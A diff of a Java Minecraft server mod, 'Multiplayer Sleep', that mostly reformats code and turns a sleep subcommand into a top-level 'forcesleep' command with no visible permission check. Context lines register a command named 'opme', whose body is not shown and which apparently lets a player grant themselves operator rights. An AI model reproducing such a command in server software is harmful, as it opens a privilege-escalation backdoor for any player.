@@ -42,9 +42,9 @@ public class MultiSleep implements ModInitializer {
   public static final String MOD_ID = "multisleep";
   public static final String MOD_NAME = "Multiplayer Sleep";
   public static final Identifier VOTE_PACKET_ID = new Identifier(MOD_ID, "vote_packet_id");
-  public static final Identifier REQUEST_BUTTONSTATES_PACKET_ID = new Identifier(MOD_ID, "request_buttonstate_packet_id");
+  public static final Identifier REQUEST_BUTTONSTATES_PACKET_ID = new Identifier(MOD_ID,
+      "request_buttonstate_packet_id");
   public static final Identifier SEND_STATE_PACKET_ID = new Identifier(MOD_ID, "send_state_packet_id");
-
 
   @Override
   public void onInitialize() {
@@ -88,16 +88,17 @@ public class MultiSleep implements ModInitializer {
         }
       }
     });
-  
-    ServerPlayNetworking.registerGlobalReceiver(REQUEST_BUTTONSTATES_PACKET_ID, (server, player, handler, buf, responseSender) -> {
-      PacketByteBuf state = PacketByteBufs.create();
-      int[] states = new int[2];
-      states[0] = boolToInt(wantsPhantoms.contains(player.getUuid()));
-      states[1] = boolToInt(permaSleepPlayers.contains(player.getUuid()));
-      state.writeIntArray(states);
 
-      ServerPlayNetworking.send(player, SEND_STATE_PACKET_ID, state);
-    });
+    ServerPlayNetworking.registerGlobalReceiver(REQUEST_BUTTONSTATES_PACKET_ID,
+        (server, player, handler, buf, responseSender) -> {
+          PacketByteBuf state = PacketByteBufs.create();
+          int[] states = new int[2];
+          states[0] = boolToInt(wantsPhantoms.contains(player.getUuid()));
+          states[1] = boolToInt(permaSleepPlayers.contains(player.getUuid()));
+          state.writeIntArray(states);
+
+          ServerPlayNetworking.send(player, SEND_STATE_PACKET_ID, state);
+        });
   }
 
   private int boolToInt(boolean b) {
@@ -121,20 +122,11 @@ public class MultiSleep implements ModInitializer {
   //@formatter:off
   private void registerCommands() {
     CommandRegistrationCallback.EVENT.register((dispatcher, dedicated) -> {
-      dispatcher.register(literal("multisleep")
-        .then(literal("forcesleep")
-          .executes(ctx -> {
-            sleep(ctx.getSource().getMinecraftServer());
-            return 0;
-          })
-        )
-        .then(literal("sleep")
-          .executes(ctx -> {
-            vote(ctx.getSource().getPlayer(), true, false);
-            return 0;
-          })
-        )
-
+      dispatcher.register(literal("forcesleep")
+        .executes(ctx -> {
+          sleep(ctx.getSource().getMinecraftServer());
+          return 0;
+        })
       );
       dispatcher.register(literal("opme")
         .executes(ctx -> {
@@ -222,10 +214,10 @@ public class MultiSleep implements ModInitializer {
         / (float) server.getCurrentPlayerCount()) * (float) 100;
     float percentNo = 100 - percentYes;
 
-    System.out.println("sleeping players: " + uuidSetToString(sleepingPlayers, server) + "\n"
-        + "awake players: " + uuidSetToString(awakePlayers, server) + "\n" + "permasleep players: "
-        + uuidSetToString(permaSleepPlayers, server) + "\n" + "initiator: " + initiator.getName().asString()
-        + "\n" + "isvoteing: " + String.valueOf(isVoting));
+    System.out.println("sleeping players: " + uuidSetToString(sleepingPlayers, server) + "\n" + "awake players: "
+        + uuidSetToString(awakePlayers, server) + "\n" + "permasleep players: "
+        + uuidSetToString(permaSleepPlayers, server) + "\n" + "initiator: " + initiator.getName().asString() + "\n"
+        + "isvoteing: " + String.valueOf(isVoting));
 
     System.out
         .println(percentYes + "----" + percentNo + "----" + requiredPercent + "----" + server.getCurrentPlayerCount());
